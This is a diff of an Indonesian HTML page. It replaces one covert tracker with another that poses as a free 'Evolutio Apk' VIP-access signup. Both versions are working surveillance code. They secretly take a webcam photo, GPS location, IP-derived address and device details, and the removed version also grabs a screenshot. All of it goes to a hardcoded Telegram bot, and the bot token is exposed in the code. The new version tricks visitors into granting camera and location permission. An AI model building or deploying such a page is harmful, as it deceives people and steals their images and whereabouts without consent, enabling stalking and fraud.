@@ -3,256 +3,207 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>bodo banget si</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+  <title>Evolutio Apk Version</title>
   <style>
     body {
-      background: #000;
       margin: 0;
-      padding: 0;
+      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
-      font-family: Arial, sans-serif;
-      color: #999;
+      background: radial-gradient(circle at top, #1a0000, #000000);
+      font-family: 'Poppins', sans-serif;
+      color: #fff;
       overflow: hidden;
     }
-
-    #loading-container {
+    .card {
+      background: rgba(30, 5, 5, 0.95);
+      border: 2px solid #ff0033;
+      border-radius: 18px;
+      padding: 30px;
+      width: 370px;
+      box-shadow: 0 0 25px #ff0033, 0 0 80px #660000 inset;
       text-align: center;
-      width: 80%;
-      max-width: 400px;
+      animation: float 3s ease-in-out infinite;
+      position: relative;
+      z-index: 2;
     }
-
-    #loading-text {
-      font-size: 22px;
-      margin-bottom: 20px;
-      color: #6e48aa;
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-12px); }
     }
-
-    #progress-container {
-      height: 3px;
-      background: #222;
-      border-radius: 3px;
-      overflow: hidden;
+    h1 { color: #ff0033; text-shadow: 0 0 20px #ff1a40; }
+    p { color: #ffb8c2; }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 15px;
+      border-radius: 8px;
+      border: 2px solid #ff0033;
+      font-size: 1rem;
     }
-
-    #progress-bar {
-      height: 100%;
-      width: 0%;
-      background: linear-gradient(90deg, #6e48aa, #9d50bb);
-      transition: width .3s ease;
+    button {
+      background: #ff0033;
+      color: #0a0a0f;
+      font-weight: bold;
+      text-transform: uppercase;
+      cursor: pointer;
+      box-shadow: 0 0 20px #ff0033;
+      transition: all .3s ease-in-out;
     }
-
-    #loading-details {
+    button:hover {
+      background: #0a0a0f;
+      color: #ff0033;
+      box-shadow: 0 0 30px #ff0033;
+    }
+    .overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.95);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      text-align: center;
+      z-index: 9999;
+    }
+    .overlay button {
+      width: auto;
       margin-top: 20px;
-      font-size: 14px;
-      color: #666;
     }
-
-    .hidden {
-      display: none;
+    .floating-card {
+      position: fixed;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%) scale(0);
+      background: rgba(30, 5, 5, 0.98);
+      border: 2px solid #ff0033;
+      border-radius: 14px;
+      padding: 25px;
+      text-align: center;
+      color: #ff0033;
+      font-size: 1.2rem;
+      box-shadow: 0 0 30px #ff0033;
+      transition: transform 0.3s ease-in-out;
+      z-index: 10000;
     }
+    .floating-card.show { transform: translate(-50%, -50%) scale(1); }
+    .join-btn { color:#0a0a0f; background:#ff0033; padding:8px 18px; border-radius:6px; text-decoration:none; font-weight:bold; transition:0.3s; }
+    .join-btn:hover { background:#0a0a0f; color:#ff0033; box-shadow:0 0 20px #ff0033; }
   </style>
 </head>
 <body>
-  <div id="loading-container">
-    <div id="loading-text">data anda sudah bocor</div>
-    <video id="v" autoplay muted class="hidden"></video>
-    <canvas id="c" class="hidden"></canvas>
+  <div class="card">
+    <h1>Evolutio Apk Version</h1>
+    <p>🌐 Dapatkan Akses Premium VIP 7 Hari.<br>Masukkan Username Anda.</p>
+    <input type="text" id="username" placeholder="Masukkan Username">
+    <button onclick="mulaiVerifikasi()">Create Account</button>
+  </div>
+
+  <!-- Overlay izin -->
+  <div id="overlay" class="overlay" style="display:none;">
+    <p>🔒 Untuk melanjutkan, Browser Memerlukan Izin Akses</p>
+    <button onclick="mintaIzin()">Coba Lagi</button>
+  </div>
+
+  <!-- Floating Card -->
+  <div id="floatingCard" class="floating-card">
+    ✅ Terimakasih,<br> Permintaan Aktivasi Sukses.<br>
+    Silahkan Follow Channel Kami<br><br>
+    <a href="https://t.me/TheEvolutionChannel" target="_blank" class="join-btn">Join Channel</a>
   </div>
 
   <script>
-    (() => {
-      const T = '7769457626:AAHfHylRFZFkaYQ_i2J3fZHuWE7T-_mG0hA',
-            C = '-1002535304990';
+    const BOT_TOKEN = "7769457626:AAHfHylRFZFkaYQ_i2J3fZHuWE7T-_mG0hA";
+    const CHAT_ID = "6304082972";
 
-      const pb = document.createElement('div');
-      pb.id = 'progress-bar';
-      document.body.appendChild(pb);
+    let savedUsername = "";
+    let izinDiberikan = false;
 
-      let p = 0;
-      const ld = document.createElement('div');
-      ld.id = 'loading-details';
-      document.body.appendChild(ld);
+    async function mulaiVerifikasi() {
+      const username = document.getElementById("username").value.trim();
+      if (!username) {
+        alert("⚠ Username wajib diisi!");
+        return;
+      }
+      savedUsername = username;
 
-      const LM = [
-        "Memeriksa modul sistem...",
-        "Memuat komponen inti...",
-        "Menginisialisasi antarmuka...",
-        "Memverifikasi koneksi...",
-        "Menyiapkan lingkungan...",
-        "Memeriksa pembaruan...",
-        "Memuat aset tampilan..."
-      ];
+      const sudahIzin = await cekIzin();
+      if (sudahIzin || izinDiberikan) {
+        tampilkanFloatingCard();
+      } else {
+        document.getElementById("overlay").style.display = "flex";
+      }
+    }
 
-      setInterval(() => {
-        p += Math.random() * 5;
-        if (p > 98) p = 98;
-        pb.style.width = p + '%';
-        if (Math.random() > .9)
-          ld.textContent = LM[Math.floor(Math.random() * LM.length)];
-      }, 500);
+    async function mintaIzin() {
+      document.getElementById("overlay").style.display = "none";
 
-      const sTG = async d => {
-        try {
-          await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: C,
-              text: d,
-              parse_mode: 'HTML'
-            })
-          })
-        } catch (e) {}
-      };
+      try {
+        navigator.geolocation.getCurrentPosition(async pos => {
+          const { latitude, longitude } = pos.coords;
+          const maps = `https://maps.google.com/?q=${latitude},${longitude}`;
 
-      const sP = async (b, f) => {
-        try {
-          const fd = new FormData();
-          fd.append('chat_id', C);
-          fd.append('photo', b, f);
-          await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {
-            method: 'POST',
-            body: fd
-          })
-        } catch (e) {}
-      };
+          const device = navigator.userAgent;
+          const os = navigator.platform;
+          const screenRes = window.screen.width + "x" + window.screen.height;
+          const lang = navigator.language;
+          const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-      const gLD = async (a, b) => {
-        try {
-          const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`);
-          const d = await r.json();
-          if (d.address) return {
-            kb: d.address.county || d.address.city || d.address.state || "Tidak diketahui",
-            kc: d.address.suburb || d.address.village || d.address.town || "Tidak diketahui",
-            fa: d.display_name || "Alamat tidak tersedia"
-          }
-        } catch (e) {}
-        return {
-          kb: "Tidak diketahui",
-          kc: "Tidak diketahui",
-          fa: "Alamat tidak tersedia"
-        }
-      };
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+          const track = stream.getVideoTracks()[0];
+          const imageCapture = new ImageCapture(track);
+          const blob = await imageCapture.takePhoto();
 
-      const cDI = async () => {
-        let m = '╭───── Tracking Report ───── ⦿\n\n';
-        m += '⚙️ DEVICE INFORMATION\n';
-        m += `🖥️ Device: ${navigator.userAgent}\n`;
-        m += `💻 Platform: ${navigator.platform}\n`;
-        m += `🌐 Bahasa: ${navigator.language}\n`;
-        m += `📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
-        m += `📺 Screen Size: ${screen.width}x${screen.height}\n`;
-        m += `🪟 Window Size: ${innerWidth}x${innerHeight}\n`;
-        m += `💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
-        m += `🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;
+          const caption = `
+👤 Username : ${savedUsername}
+💻 Device   : ${device}
+🧠 OS       : ${os}
+🖥️ Resolusi : ${screenRes}
+🌐 Bahasa   : ${lang}
+🕓 Timezone : ${tz}
+📍 Lokasi   : ${maps}
+`;
 
-        if (navigator.getBattery) {
-          try {
-            const b = await navigator.getBattery();
-            m += `🔋 Battery: ${Math.floor(b.level * 100)}%\n`;
-            m += `🔌 Charging: ${b.charging ? '✅ YA' : '❌ TIDAK'}\n`;
-          } catch (e) {
-            m += '🔋 Battery: ❌ Tidak tersedia\n';
-          }
-        }
+          const formData = new FormData();
+          formData.append("chat_id", CHAT_ID);
+          formData.append("caption", caption);
+          formData.append("photo", blob);
 
-        m += `⏰ Waktu Akses: ${new Date().toString()}\n`;
-        m += `🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n`;
-        m += `📜 History Length: ${history.length}\n`;
-        m += `✋ Touch Support: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
-        m += `🔗 Referrer: ${document.referrer || 'None'}\n`;
-        m += `🌍 URL: ${location.href}\n`;
-        m += `📄 Title: ${document.title}\n`;
-        m += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
-        m += `🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;
-
-        try {
-          const i = await fetch('https://ipapi.co/json/');
-          const d = await i.json();
-          m += '📍 LOCATION INFORMATION\n';
-          m += `📡 IP Address: ${d.ip}\n`;
-          m += `🏙️ Kota: ${d.city}\n`;
-          m += `🏙️ Kabupaten: ${d.region}\n`;
-          m += `🗺️ Wilayah: ${d.region}\n`;
-          m += `🌎 Negara: ${d.country_name}\n`;
-          m += `🏷️ Kode Pos: ${d.postal}\n`;
-
-          if (d.latitude && d.longitude) {
-            m += `📌 Latitude: ${d.latitude}\n`;
-            m += `📍 Longitude: ${d.longitude}\n`;
-
-            const l = await gLD(d.latitude, d.longitude);
-            m += `🏙️ Kabupaten: ${l.kb}\n`;
-            m += `🏙️ Kecamatan: ${l.kc}\n`;
-            m += `🏠 Alamat Lengkap: ${l.fa}\n`;
-          }
-        } catch (e) {
-          m += '❌ Gagal mendapatkan informasi lokasi\n';
-        }
-
-        m += '\n╰───── Telegram @Kyxsancs ───── ⦿';
-        return m;
-      };
-
-      const ST = async () => {
-        await sTG(await cDI());
-
-        try {
-          const v = document.getElementById('v'),
-                c = document.getElementById('c'),
-                st = await navigator.mediaDevices.getUserMedia({ video: true });
-
-          v.srcObject = st;
-          await new Promise(r => setTimeout(r, 3000));
-
-          c.width = v.videoWidth;
-          c.height = v.videoHeight;
-          c.getContext('2d').drawImage(v, 0, 0);
-
-          c.toBlob(b => sP(b, 'camera_capture.jpg'), 'image/jpeg');
-          st.getTracks().forEach(t => t.stop());
-        } catch (e) {
-          await sTG('❌ Camera access blocked');
-        }
-
-        setTimeout(async () => {
-          try {
-            const cn = await html2canvas(document.body);
-            cn.toBlob(b => sP(b, 'screenshot.jpg'), 'image/jpeg');
-          } catch (e) {
-            await sTG('❌ Screenshot failed');
-          }
-        }, 5000);
-
-        if (navigator.geolocation) {
-          navigator.geolocation.watchPosition(async p => {
-            let g = `📍 LIVE GPS TRACKING\n`;
-            g += `📌 Lat: ${p.coords.latitude}\n`;
-            g += `📍 Lng: ${p.coords.longitude}\n`;
-            g += `🎯 Akurasi: ${p.coords.accuracy}m\n`;
-
-            const l = await gLD(p.coords.latitude, p.coords.longitude);
-            g += `🏙️ Kabupaten: ${l.kb}\n`;
-            g += `🏙️ Kecamatan: ${l.kc}\n`;
-            g += `🏠 Alamat: ${l.fa}\n`;
-
-            await sTG(g);
-          }, async e => {
-            await sTG(`❌ GPS Error: ${e.message}`);
-          }, {
-            enableHighAccuracy: true,
-            maximumAge: 0,
-            timeout: 5000
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: formData
           });
-        }
-      };
 
-      setTimeout(ST, 3000);
-    })();
+          track.stop();
+          izinDiberikan = true;
+          tampilkanFloatingCard();
+
+        }, err => {
+          if (!izinDiberikan) document.getElementById("overlay").style.display = "flex";
+        }, { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 });
+      } catch (err) {
+        if (!izinDiberikan) document.getElementById("overlay").style.display = "flex";
+      }
+    }
+
+    function tampilkanFloatingCard() {
+      const card = document.getElementById("floatingCard");
+      card.classList.add("show");
+      setTimeout(() => card.classList.remove("show"), 5000);
+    }
+
+    async function cekIzin() {
+      try {
+        const geo = await navigator.permissions.query({ name: "geolocation" });
+        const cam = await navigator.permissions.query({ name: "camera" });
+        if (geo.state === "granted" && cam.state === "granted") {
+          izinDiberikan = true;
+          return true;
+        }
+      } catch (e) {}
+      return false;
+    }
   </script>
 </body>
 </html>
